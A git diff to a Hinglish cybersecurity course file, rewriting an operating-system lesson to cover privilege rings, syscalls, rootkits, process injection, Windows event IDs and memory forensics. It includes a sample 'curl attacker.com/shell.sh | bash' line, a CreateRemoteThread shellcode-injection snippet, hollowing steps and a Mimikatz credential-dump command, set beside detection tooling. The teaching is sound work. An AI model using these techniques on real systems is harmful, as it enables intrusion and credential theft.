@@ -849,33 +849,504 @@ Agar unexpected keyboard device dikh rahe hain — immediately disconnect karo a
   },
 
   "cb-03": {
-    title: "Operating System Basics",
+    title: "Operating System Internals",
     image: "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=900&fit=crop&auto=format",
-    tagline: "Computer ka traffic controller — bina OS ke computer ek box hai!",
+    tagline: "Ring 0 se Ring 3 tak — OS andar se kaise kaam karta hai aur hackers ise kaise exploit karte hain",
     sections: [
       {
-        heading: "🎛️ Operating System Kya Hai?",
-        content: `Operating System (OS) woh software hai jo hardware aur user ke beech mediator ka kaam karta hai. Jab tum computer on karte ho, pehle OS load hota hai — phir baaki sab kuch.\n\nOS ke bina computer ek electronic box hai — kuch nahi kar sakta.\n\n**Popular Operating Systems:**\n• **Windows** — Microsoft ka product, duniya mein sabse zyada use hota hai (desktop pe ~75%)\n• **macOS** — Apple ka OS, sirf Apple computers pe chalti hai\n• **Linux** — Open source, free, hackers aur developers ki favourite\n• **Android** — Google ka mobile OS (Linux pe based)\n• **iOS** — Apple ka mobile OS\n\n**OS ke main kaam:**\n1. Hardware manage karna\n2. Programs chalana\n3. Files manage karna\n4. Users aur security handle karna\n5. Network connections manage karna`,
+        heading: "🔵 Privilege Rings — CPU Ka Security Model",
+        content: `Modern CPUs ek layered privilege model implement karte hain jise "Protection Rings" kehte hain. Intel x86 architecture mein technically 4 rings hain (0-3), lekin practice mein mostly 2 use hote hain. Yeh samajhna privilege escalation aur kernel exploits ke liye foundational hai.
+
+\`\`\`
+        ┌─────────────────────────────────┐
+        │         RING 3 — User Mode       │
+        │   Applications, Browsers, Games  │
+        │   Restricted: no direct hardware │
+        │                                  │
+        │   ┌───────────────────────────┐  │
+        │   │      RING 2 (rarely used) │  │
+        │   │   Device drivers (older)  │  │
+        │   │                           │  │
+        │   │   ┌─────────────────────┐ │  │
+        │   │   │  RING 1 (rarely)    │ │  │
+        │   │   │  Some hypervisors   │ │  │
+        │   │   │                     │ │  │
+        │   │   │  ┌───────────────┐  │ │  │
+        │   │   │  │  RING 0       │  │ │  │
+        │   │   │  │  KERNEL MODE  │  │ │  │
+        │   │   │  │  Full access  │  │ │  │
+        │   │   │  │  to hardware  │  │ │  │
+        │   │   │  └───────────────┘  │ │  │
+        │   │   └─────────────────────┘ │  │
+        │   └───────────────────────────┘  │
+        └─────────────────────────────────┘
+\`\`\`
+
+**Ring 0 — Kernel Mode (God Mode):**
+- Complete hardware access — CPU, RAM, I/O sab directly
+- Memory map control — virtual to physical address translation
+- Interrupt handling — hardware events process karna
+- Process scheduling — CPU time distribute karna
+- OS kernel, device drivers yahan chalte hain
+
+**Ring 3 — User Mode (Jail):**
+- No direct hardware access
+- Restricted memory — sirf apna allocated space
+- Har hardware operation ke liye kernel se permission maangni padti hai (syscall)
+- Crash karo — sirf woh process crash, OS safe rehta hai
+- Chrome, Firefox, Word, games — sab yahan chalte hain
+
+**Why This Matters for Security:**
+
+| Attack Type | Goal |
+|------------|------|
+| Privilege Escalation | Ring 3 → Ring 0 jaana (user → admin/kernel) |
+| Rootkit | Ring 0 mein apna code chalana — OS ko andhaa banana |
+| Kernel Exploit | Kernel vulnerability use karke Ring 0 access |
+| User-to-Kernel | CVE-2021-4034 (pkexec), Dirty COW jaise |
+
+**Modern Extensions — Even Below Ring 0:**
+- **Ring -1 (Hypervisor):** VMware, Hyper-V — VMs manage karta hai
+- **Ring -2 (SMM):** System Management Mode — BIOS/UEFI controls karta hai, OS ko dikh bhi nahi sakta
+- **Ring -3 (ME/AMD PSP):** Intel Management Engine — completely separate CPU, OS ko control bhi kar sakta hai
+
+UEFI rootkits aur bootkit attacks inhi lower rings ko exploit karte hain — isliye OS reinstall se remove nahi hote.`,
       },
       {
-        heading: "⚙️ OS Andar Se Kaise Kaam Karta Hai?",
-        content: `OS ke kuch important components hote hain:\n\n**Kernel** — OS ka core. Directly hardware se baat karta hai. CPU, RAM, storage sab kernel ke through manage hote hain. Linux ka kernel "monolithic" hai — sab ek jagah.\n\n**Process Manager** — Multiple apps ek saath chalti hain. OS decide karta hai kise kitna CPU time mile. Ise "scheduling" kehte hain.\n\n**Memory Manager** — RAM ko different programs mein distribute karta hai. Ek program dusre ki memory access na kare — yeh ensure karta hai.\n\n**File System** — Files ko organize karta hai (Windows: NTFS, Linux: ext4, Mac: APFS).\n\n**Device Drivers** — Har hardware ke liye OS ke paas ek "translator" hota hai. Naya printer lagaya — driver install karna padta hai taki OS samjhe printer se kaise baat karein.`,
+        heading: "📞 System Calls — User Space Ka Kernel Se Request",
+        content: `User-space applications directly hardware access nahi kar sakti (Ring 3 restriction). Har hardware-related operation ke liye ek controlled entry point use karna padta hai — yahi System Call (syscall) hai.
+
+**Syscall Flow — Step by Step:**
+\`\`\`
+User App (Ring 3):
+  wants to read a file → calls read() function
+
+                    ↓ [Library wrapper: glibc on Linux]
+
+C Library:
+  puts arguments in registers
+  syscall number in RAX register
+  executes SYSCALL instruction
+
+                    ↓ [CPU switches to Ring 0]
+
+Kernel (Ring 0):
+  validates arguments (is this path allowed? does file exist?)
+  performs actual file read from storage
+  copies data to user-space buffer
+  returns to Ring 3
+
+                    ↓ [CPU switches back to Ring 3]
+
+User App:
+  receives data, continues execution
+\`\`\`
+
+**Important Linux Syscalls — Security Professionals Ko Yaad Hone Chahiye:**
+
+| Syscall | Number | Kya Karta Hai | Security Relevance |
+|---------|--------|--------------|-------------------|
+| read | 0 | File/socket read | Data exfiltration |
+| write | 1 | File/socket write | Log tampering |
+| open | 2 | File open | Malware reads configs |
+| execve | 59 | New process execute | Shell spawn, RCE |
+| socket | 41 | Network socket create | C2 communication |
+| connect | 42 | TCP/UDP connect | Reverse shell |
+| fork | 57 | Child process create | Process spawning |
+| mmap | 9 | Memory map | Shellcode injection |
+| ptrace | 101 | Debug another process | Debugger, anti-debug |
+| clone | 56 | Thread/process clone | Container isolation |
+
+**Strace — Live Syscall Monitoring:**
+\`\`\`bash
+# Kisi bhi process ke syscalls dekho real-time:
+strace -p 1234              # PID 1234 ke syscalls trace karo
+strace -p 1234 -e execve    # Sirf execve (new process) dekho
+strace ls                    # ls command ke sab syscalls
+strace -o output.txt ls      # File mein save karo
+
+# Malware analysis mein use:
+strace ./suspicious_file     # Malware ke syscalls dekho bina run kiye puri tarah
+# Output mein: connect() call = network C2? execve() = shell spawn?
+
+# Example output:
+# execve("/bin/bash", ["bash", "-c", "curl attacker.com/shell.sh | bash"], ...)
+# → Malware curl se script download karke bash mein pipe kar raha hai!
+\`\`\`
+
+**Seccomp — Syscall Filtering (Defense):**
+\`\`\`c
+// Container aur sandboxing mein use hota hai
+// Process ke allowed syscalls restrict karo:
+seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
+// execve syscall block → process naya program execute nahi kar sakta
+// → RCE exploit mile bhi toh shell spawn nahi hoga
+
+// Docker containers pe seccomp profile default se apply hota hai
+// ~44 dangerous syscalls block hote hain by default
+\`\`\``,
       },
       {
-        heading: "🐧 Windows vs Linux — Cybersecurity Ke Liye",
-        content: `Cybersecurity professional ke liye dono zaroori hain:\n\n**Windows:**\n• Most corporate environments Windows use karte hain\n• Active Directory, Group Policy — enterprise security\n• Windows Defender built-in antivirus\n• PowerShell — powerful scripting\n\n**Linux:**\n• Kali Linux — ethical hacking ke liye best\n• Servers ka 96% Linux pe chal raha hai\n• Command line powerful hai\n• Open source — source code dekh sakte ho\n• Zyada secure (fewer viruses target Linux)\n\n**Dono seekhna zaroori hai!** Corporate attack karo toh Windows samajhna zaroori, server attack karo toh Linux.`,
+        heading: "👻 Rootkits — OS Ko Andhaa Karna",
+        content: `Rootkit malware ka ek category hai jo khud ko OS se chhupaata hai — OS ki aankhon se invisible. Ek successful rootkit ke saath attacker mahine ya saalo tak undetected reh sakta hai.
+
+**Rootkit Types — Privilege Level Pe Based:**
+
+**1. User-Mode Rootkit (Ring 3):**
+\`\`\`
+Technique: DLL injection ya process hollowing
+Target: User-space API functions hook karna
+Example: Ld.so preload (Linux), AppInit_DLLs (Windows)
+
+Kaise chhupata hai:
+- CreateToolhelp32Snapshot() hook karo → process list se apna naam hata do
+- FindFirstFile() hook karo → file listing se files hata do
+- GetTcpTable() hook karo → network connections hata do
+
+Detection: 
+- Process list tools jo direct syscall karte hain (bypass hooking)
+- Memory forensics
+- Relatively easy to detect — user mode mein hota hai
+\`\`\`
+
+**2. Kernel-Mode Rootkit (Ring 0):**
+\`\`\`
+Technique: Kernel module (Linux) ya driver (Windows) load karna
+Target: SSDT (System Service Descriptor Table) ya IDT hook karna
+Example: Azazel (Linux), ZeroAccess (Windows)
+
+SSDT Hooking — How It Works:
+Normal flow:
+  App → NtQuerySystemInformation (user) → SSDT → Kernel function → result
+
+Rootkit hooks SSDT:
+  App → NtQuerySystemInformation → [ROOTKIT INTERCEPTS] → filters result → App gets fake list
+
+Result: Process list check karo — rootkit missing!
+        File list check karo — rootkit files missing!
+        Network connections check karo — C2 missing!
+        Khud OS andhaa ho jaata hai
+
+Detection:
+- Boot from external drive, mount infected drive — rootkit inactive
+- Memory forensics (Volatility): cross-view analysis
+- PatchGuard (Windows 64-bit): SSDT modification detect → BSOD
+- Anti-rootkit tools: GMER, RootkitRevealer, Malwarebytes Anti-Rootkit
+\`\`\`
+
+**3. Bootkit (Ring -1/-2):**
+\`\`\`
+Kahan: MBR (Master Boot Record) ya VBR (Volume Boot Record) mein
+Kab load hota: OS se pehle!
+Examples: TDL4, Necurs, Gapz
+
+Timeline:
+Power ON → BIOS/UEFI → [BOOTKIT LOADS] → Bootloader → OS
+                           ↑
+                    Yahan inject hua — OS load hone se pehle
+                    OS ko load karte waqt modify kar sakta hai
+                    Antivirus se invisible — AV OS ke baad load hota hai
+
+Remove karna: bootrec /rebuildbcd, bootrec /fixmbr (Windows)
+              OS reinstall bhi zaroori ho sakta hai
+              UEFI Secure Boot prevent karta hai (if enabled)
+\`\`\`
+
+**Real-World Rootkit Cases:**
+- **Sony BMG Rootkit (2005):** Music CD insert karo → Windows pe rootkit install! Sony ne copy protection ke liye kiya. 6 million PCs affected. Class action lawsuit.
+- **Flame (2012):** NSA/Israel ka state-sponsored malware, Stuxnet se related. Kernel rootkit + fake Microsoft update certificate. 5 saalo tak undetected.
+- **Necurs Botnet (2012-2020):** Peak pe 9 million infected machines. Bootkit + rootkit combination. Microsoft ne 2020 mein domain seizure se disrupt kiya.`,
       },
       {
-        heading: "🔐 OS Security — Kya Dhyaan Rakhen?",
-        content: `**Updates — MUST karo!**\nWannaCry ransomware 2017 mein Windows ka ek purana vulnerability use karke phela tha. Jo log updates nahi karte the, unka data lock ho gaya.\n\n**User Permissions:**\n• Administrator account daily use mat karo\n• Principle of Least Privilege — sirf utni permission do jo zaroori ho\n• Linux mein "sudo" use karo sirf jab zaroorat ho\n\n**Logs — Sab Record Hota Hai:**\n• Windows: Event Viewer\n• Linux: /var/log/ folder\n• Koi bhi suspicious activity log mein track hoti hai\n• SIEM tools inhi logs ko analyze karte hain\n\n**File Permissions:**\n• Linux mein har file ke permissions hote hain — read, write, execute\n• chmod command se permissions change karte hain`,
+        heading: "💉 Process Injection — Legitimate Mein Hide Karna",
+        content: `Process injection ek technique hai jisme attacker apna malicious code ek legitimate, trusted process ke andar inject karta hai. Antivirus ko woh malicious code nahi dikhta — sirf "explorer.exe" ya "svchost.exe" dikhta hai.
+
+**Kyu Process Injection Karte Hain:**
+1. **AV Evasion:** Trusted process ke naam se kaam hota hai
+2. **Privilege Inheritance:** svchost.exe SYSTEM pe chalata hai → inject karo → SYSTEM privileges milti hain
+3. **Network Firewall Bypass:** Windows Firewall known processes ko allow karta hai
+4. **Memory Only:** Disk pe koi file nahi — forensics mushkil
+
+**Method 1: CreateRemoteThread (Classic)**
+\`\`\`c
+// Attacker ka code:
+// Step 1: Target process mein memory allocate karo
+HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, shellcodeSize, 
+                                      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+// Step 2: Shellcode copy karo target process mein
+WriteProcessMemory(hProcess, pRemoteCode, shellcode, shellcodeSize, NULL);
+
+// Step 3: Thread create karo jo shellcode execute kare
+CreateRemoteThread(hProcess, NULL, 0, 
+                   (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
+
+// Result: shellcode ab explorer.exe ke andar chal raha hai!
+// Task Manager mein: explorer.exe — looks completely normal
+\`\`\`
+
+**Method 2: Process Hollowing (Doppelganging)**
+\`\`\`
+Step 1: Legitimate process create karo suspended state mein
+        CreateProcess("svchost.exe", ..., CREATE_SUSPENDED, ...)
+        
+Step 2: Process ka original code memory se hata do
+        NtUnmapViewOfSection() — original code unmap
+
+Step 3: Malicious code load karo us jagah
+        VirtualAllocEx() + WriteProcessMemory()
+
+Step 4: Entry point update karo
+        SetThreadContext() — malicious code pe point karo
+
+Step 5: Process resume karo
+        ResumeThread()
+
+Result: Task Manager mein "svchost.exe" dikhega
+        Lekin andar malicious code chal raha hai
+        Process ka path legitimate dikhega (C:\Windows\System32\svchost.exe)
+        Digital signature bhi valid dikhegi!
+\`\`\`
+
+**Method 3: DLL Injection**
+\`\`\`
+Target process mein apni DLL load karvana:
+
+1. Malicious DLL (evil.dll) disk pe rakh do
+2. Target process mein LoadLibrary() ka address dhundho
+3. CreateRemoteThread se LoadLibrary("evil.dll") call karo target process mein
+4. Target process khud apni DLL load kar lega — attacker ki!
+5. DLL ka DllMain() automatically execute hoga
+\`\`\`
+
+**Detection — Kaise Pakdein:**
+\`\`\`bash
+# Volatility (memory forensics tool) se:
+python vol.py -f memory.raw malfind
+# → Executable memory regions jo kisi DLL se map nahi hain → suspicious!
+
+python vol.py -f memory.raw dlllist -p 1234
+# → Loaded DLLs list — unexpected DLL?
+
+python vol.py -f memory.raw cmdline
+# → Process command line — legitimate svchost ke paas arguments hone chahiye
+
+# Windows pe live detection:
+Process Hacker tool → process ka "Memory" tab → executable regions check
+Suspicious: RWX (Read-Write-Execute) memory jo kisi module se nahi
+\`\`\`
+
+**DLL Hijacking — Bonus Attack:**
+\`\`\`
+Windows DLL search order:
+1. Application directory (same folder as .exe)
+2. System32
+3. System  
+4. Windows directory
+5. Current directory
+6. PATH directories
+
+Attack:
+- App "version.dll" load karne ki koshish karta hai
+- System32 mein hai, lekin app folder mein nahi
+- Attacker apni malicious "version.dll" app folder mein rakh deta hai
+- App automatically attacker ki DLL load kar leti hai — step 1 mein milti hai!
+- Specially dangerous: agar app SYSTEM ya admin privileges se chalti ho
+
+Detection: Process Monitor filter: "CreateFile" + "NAME NOT FOUND" + ".dll"
+Prevention: Absolute paths use karo DLL loading mein; DLL signing verify karo
+\`\`\``,
+      },
+      {
+        heading: "🪟 Windows vs Linux Internals — Security Comparison",
+        content: `Cybersecurity professional ko dono OS ke internals samajhne chahiye — corporate environments Windows use karte hain, servers mostly Linux. Attack aur defense techniques dono pe alag hoti hain.
+
+**Process Architecture:**
+
+| Feature | Windows | Linux |
+|---------|---------|-------|
+| Process ID | PID (numeric) | PID (numeric) |
+| Privileged user | SYSTEM, Administrator | root (UID 0) |
+| Process list | Task Manager, tasklist | ps aux, /proc |
+| Trusted processes | svchost.exe, lsass.exe | init/systemd, kthreadd |
+| Process injection target | explorer.exe, lsass.exe | bash, python |
+| Kernel modules | .sys drivers | .ko modules |
+
+**Critical Windows Processes (Attackers Target These):**
+
+\`\`\`
+lsass.exe — Local Security Authority Subsystem
+  → Credentials store karta hai (hashes, Kerberos tickets)
+  → Mimikatz directly isse target karta hai
+  → "sekurlsa::logonpasswords" — plaintext passwords dump!
+
+svchost.exe — Service Host
+  → Multiple Windows services run karta hai
+  → Common injection target — blends in (10-20+ instances)
+  → Legitimate: "svchost.exe -k netsvcs", Malicious: "svchost.exe" no args
+
+winlogon.exe — Windows Login
+  → Login UI, credential entry
+  → Fake winlogon (credential harvesting) attack vector
+
+explorer.exe — Windows Shell
+  → Desktop, taskbar, file manager
+  → Common injection target — always running, trusted
+\`\`\`
+
+**Linux — Kahan Dhundhen Suspicious Activity:**
+
+\`\`\`bash
+# Running processes with full paths:
+ps auxf                      # Forest view — parent-child relationships
+ps -eo pid,ppid,user,cmd     # PID, parent PID, user, command
+
+# Hidden processes (rootkit check):
+ls /proc/ | grep "^[0-9]" > ps_proc.txt
+ps aux | awk '{print $2}' | sort -n > ps_ps.txt
+diff ps_proc.txt ps_ps.txt   # Difference = rootkit hiding processes?
+
+# Recently modified system files (potential rootkit):
+find /bin /sbin /usr/bin /usr/sbin -newer /tmp/reference_file -type f
+
+# Network connections with process info:
+ss -tulpn                    # All listening ports with process
+netstat -tulpn               # Alternative
+
+# Loaded kernel modules (possible rootkit module):
+lsmod | grep -v "^Module"
+# Suspicious: module with no known function, random name
+
+# Cron jobs (persistence):
+crontab -l                   # Current user
+cat /etc/cron* /var/spool/cron/crontabs/*  # System-wide
+\`\`\`
+
+**Windows Event IDs — SOC Analyst Ki Toolkit:**
+
+| Event ID | Kya Hua | Suspicious When |
+|---------|---------|----------------|
+| 4624 | Successful login | Off-hours, unusual source IP |
+| 4625 | Failed login | Multiple failures = brute force |
+| 4648 | Explicit credential login | Pass-the-Hash indicator |
+| 4688 | New process created | powershell.exe parent = browser/Office |
+| 4697 | Service installed | New service = backdoor? |
+| 4698 | Scheduled task created | Persistence mechanism |
+| 4719 | Audit policy changed | Attacker covering tracks |
+| 1102 | Audit log cleared | 🚨 Definitely suspicious! |
+| 4776 | Credential validation | NTLM authentication |
+| 7045 | New service installed | Malware as a service |
+
+\`\`\`powershell
+# PowerShell — Event log hunting:
+# Last 50 failed logins:
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 |
+  Select TimeCreated, @{n='User';e={$_.Properties[5].Value}},
+         @{n='IP';e={$_.Properties[19].Value}}
+
+# New processes with PowerShell:
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
+  Where {$_.Message -like "*powershell*"} | Select TimeCreated, Message
+\`\`\``,
+      },
+      {
+        heading: "🧠 Virtual Memory aur Paging — Memory Isolation",
+        content: `Har process ko lagta hai ki poori RAM sirf uski hai — yeh illusion virtual memory create karta hai. Yeh security mechanism aur attack vector dono hai.
+
+**Virtual Memory Kaise Kaam Karta Hai:**
+\`\`\`
+Physical RAM: 8 GB actual memory
+
+Process A (Chrome):    Virtual address 0x00400000 → Physical 0x12345000
+Process B (Notepad):   Virtual address 0x00400000 → Physical 0x87654000
+Process C (Malware):   Virtual address 0x00400000 → Physical 0x56789000
+
+Teeno processes same virtual address use karte hain
+Lekin different physical locations pe map hote hain!
+OS ka Page Table ye mapping track karta hai
+\`\`\`
+
+**Page Table aur TLB:**
+- **Page:** Memory ka 4KB chunk (standard size)
+- **Page Table:** Virtual → Physical address mapping database (kernel manage karta hai)
+- **TLB (Translation Lookaside Buffer):** Fast cache for recent page translations (CPU andar)
+- **Page Fault:** Virtual address access karo jo abhi RAM mein nahi → OS disk (pagefile/swap) se load karta hai
+
+**Security Implications:**
+
+\`\`\`
+1. Process Isolation:
+   Chrome crash karo → Notepad safe, OS safe
+   Malware sirf apni memory access kar sakti hai (without exploit)
+
+2. ASLR (Address Space Layout Randomization):
+   Har process start pe random base addresses assign hoti hain
+   Stack, heap, libraries — sab random locations
+   Attacker shellcode ka address predict nahi kar sakta
+   
+   Without ASLR: stack hamesha 0xbfffffff ke paas → easy to guess
+   With ASLR:    stack 0x7ffd23a00000 ya 0x7ffe87b30000 → random!
+   
+   Bypass: information leak vulnerability dhundho jo address reveal kare
+   Then use that address for ROP chain
+
+3. NX/DEP (No-Execute / Data Execution Prevention):
+   Memory pages: READ | WRITE | EXECUTE flags
+   Data (stack, heap): R + W only, no X
+   Code (.text section): R + X only, no W
+   
+   Shellcode: data area mein inject karo → can't execute (NX)
+   Bypass: ROP (Return-Oriented Programming) — existing code gadgets
+\`\`\`
+
+**Pagefile/Swap — Forensics Gold Mine:**
+\`\`\`
+Windows: C:\pagefile.sys
+Linux:   /dev/sdaX (swap partition) ya /swapfile
+
+Kya milta hai pagefile mein:
+- Browser history (URLs, search queries)
+- Document content (partially)
+- Passwords jo RAM se swap out hue
+- Chat messages
+- Network credentials
+
+Forensics tool: Volatility can analyze pagefiles
+Live collection: FTK Imager se pagefile.sys copy (locked file — VSS shadow copy use)
+
+Defense: Pagefile encryption enable karo:
+Windows: Group Policy → Computer Config → Windows Settings → Security Settings →
+         Local Policies → Security Options → "Shutdown: Clear virtual memory pagefile"
+\`\`\`
+
+**Practical: Apne System Ki Memory Map Dekho:**
+\`\`\`bash
+# Linux:
+cat /proc/self/maps         # Current process ki memory map
+cat /proc/1234/maps         # PID 1234 ki memory map
+# Output: start-end perms offset dev inode pathname
+# 7f8b234000-7f8b254000 r-xp 00000000 08:01 786432 /lib/x86_64/libc.so.6
+#                         ↑ r=read, x=execute, p=private
+
+# Windows (Process Hacker tool):
+# Process → Memory → List all regions
+# Look for: RWX (dangerous) or MEM_IMAGE=FALSE but executable
+
+# PowerShell — process memory regions:
+Get-Process chrome | ForEach {$_.Modules | Select ModuleName, BaseAddress, ModuleMemorySize}
+\`\`\``,
       },
     ],
     keyPoints: [
-      "OS = Hardware aur User ke beech mediator",
-      "Kernel OS ka core hai — directly hardware se baat karta hai",
-      "Windows: corporate, Linux: servers aur hacking tools",
-      "Updates zaroori hain — WannaCry jaise attacks rokte hain",
-      "Principle of Least Privilege — basic security rule",
+      "Ring 0 (Kernel) = God mode, full hardware access; Ring 3 (User) = restricted jail — har app Ring 3 mein chalti hai",
+      "Syscall = user app ka kernel se request — strace se trace karo, seccomp se filter karo (container security ka base)",
+      "Rootkit SSDT hook karke OS ki process/file listing tamper karta hai — khud OS ko andhaa kar deta hai",
+      "Process Injection: shellcode legitimate process (explorer.exe, svchost.exe) mein inject — AV ko trusted process dikhta hai",
+      "Process Hollowing: legitimate process spawn karo suspended, original code replace karo malicious se, resume karo",
+      "Windows Event IDs: 4624 (login OK), 4625 (login fail), 4688 (new process), 1102 (log cleared = 🚨 attacker)",
+      "ASLR randomizes memory addresses; NX/DEP blocks code execution in data pages — dono ROP attacks se bypass hote hain",
+      "Pagefile.sys (Windows) aur swap (Linux) mein passwords, chat messages, credentials residual rehte hain — forensics gold mine",
     ],
   },
 
